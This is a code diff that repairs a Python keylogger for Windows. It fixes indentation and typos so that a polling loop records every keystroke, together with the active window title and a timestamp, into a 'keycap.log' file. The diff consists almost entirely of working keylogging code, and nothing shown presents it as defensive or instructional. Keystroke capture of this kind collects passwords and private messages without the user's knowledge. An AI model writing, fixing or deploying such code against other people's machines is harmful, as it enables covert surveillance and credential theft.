@@ -35,16 +35,16 @@ def key_notes(k, is_shift_or_caps):
             0x06: "X2_MOUSE_BUTTON",
         }
         return special_keys.get(k, "UNKNOWN_KEY_{}".format(k))
-    def keylog(file):
-        header_file(file)
-        while True:
-            time.sleep(0.01)
-            hwnd = win32gui.GetForegroundWindow()
-            _, pid = win32process.GetWindowThreadProcessId(hwnd)
-            process_path = "" #Aqui se dberia obtener la ruta del proceso
-            title = win32gui.GetWindowText(hwnd)
-            now = datetime.now()
-            is_shift_pressed = win32api.GetKeyState(0x10) & 0x8000 != 0
+def keylog(file):
+    header_file(file)
+    while True:
+        time.sleep(0.01)
+        hwnd = win32gui.GetForegroundWindow()
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        process_path = "" #Aqui se dberia obtener la ruta del proceso
+        title = win32gui.GetWindowText(hwnd)
+        now = datetime.now()
+        is_shift_pressed = win32api.GetKeyState(0x10) & 0x8000 != 0
 
         for i in range (256):
             if win32api.GetAsyncKeyState(i) & 1:
@@ -52,12 +52,12 @@ def key_notes(k, is_shift_or_caps):
                     now.hour(),
                     now.minute(),
                     now.second(),
-                    process_path_strip(),
-                    tittle.strip()
-                    key_notes(i, is_shift_pressed),
-
+                    process_path.strip(),
+                    title.strip(),
+                    key_notes(i, is_shift_pressed)
                 )
                 log(file, s)
+
 def header_file(file):
     os_info = "OS: type: {}\nVersion: {}\n".format(os.name, os.sys.getwindowsversion())
     log(file, os_info)
@@ -68,7 +68,7 @@ def main():
     filename = "keycap.log"
     try:
         with open(filename, "w") as output:
-            keylog(output)|
+            keylog(output)
     except Exception as e:
         error("couldnt create Output file: {}\n", e)
     if __name__ == "__main__":
